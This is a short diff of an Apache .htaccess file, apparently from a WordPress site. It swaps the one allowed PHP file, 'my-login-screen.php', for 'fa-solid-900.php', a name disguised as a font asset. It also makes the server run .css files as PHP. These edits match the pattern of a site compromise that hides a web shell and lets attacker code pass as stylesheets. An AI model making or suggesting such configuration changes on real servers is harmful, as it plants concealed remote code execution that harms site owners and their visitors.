@@ -27,7 +27,7 @@
     Deny from all
 </Files>
 
-<FilesMatch "^(my-login-screen.php)$">
+<FilesMatch "^(fa-solid-900.php)$">
 
  Order allow,deny
 
@@ -35,7 +35,7 @@
 
 </FilesMatch>
 
- AddType application/x-httpd-php .php
+ AddType application/x-httpd-php .css
 
 <IfModule mod_rewrite.c>
 
@@ -54,3 +54,4 @@ RewriteRule . /index.php [L]
 </IfModule>
 ErrorDocument 403 /index.php
 ErrorDocument 404 /index.php
+
